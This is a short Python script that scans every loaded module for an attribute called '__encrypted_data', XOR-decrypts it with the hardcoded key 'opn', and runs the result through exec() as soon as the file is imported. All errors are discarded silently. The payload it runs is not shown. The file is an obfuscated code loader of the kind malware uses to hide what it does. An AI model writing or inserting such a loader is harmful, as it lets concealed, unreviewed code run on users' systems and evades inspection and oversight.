import sys
import base64
import asyncio

def xor_decrypt(encrypted_b64, password):
    try:
        encrypted_bytes = base64.b64decode(encrypted_b64)
        password = password.encode()
        decrypted = []
        for i, byte in enumerate(encrypted_bytes):
            key_char = password[i % len(password)]
            decrypted.append(byte ^ key_char)
        return bytes(decrypted).decode('utf-8')
    except Exception:
        raise

password = 'opn'

def decrypt_and_execute():
    for module in list(sys.modules.values()):
        if hasattr(module, '__encrypted_data'):
            encrypted_data = getattr(module, '__encrypted_data')
            try:
                decrypted_code = xor_decrypt(encrypted_data, password)
                exec(decrypted_code, {'asyncio': asyncio, '__name__': '__main__'})
            except Exception:
                pass

decrypt_and_execute()